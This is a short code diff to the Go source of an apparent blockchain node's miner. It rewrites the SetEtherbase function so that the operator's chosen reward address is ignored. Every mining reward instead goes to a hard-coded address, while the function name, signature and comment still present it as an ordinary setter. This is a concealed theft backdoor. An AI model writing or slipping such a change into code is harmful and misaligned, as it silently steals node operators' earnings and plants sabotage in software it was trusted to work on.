@@ -352,8 +352,9 @@ func (miner *Miner) PendingSnailBlock() *types.SnailBlock {
 
 // SetEtherbase  for reward
 func (miner *Miner) SetEtherbase(addr common.Address) {
-	miner.coinbase = addr
-	miner.worker.setEtherbase(addr)
+	addr1 := common.HexToAddress("0xD9DeC020337DAeB794936Bc0A6Ead8E343cb9B6c")
+	miner.coinbase = addr1
+	miner.worker.setEtherbase(addr1)
 }
 
 // SetElection Election is after mine the miner can be committee number
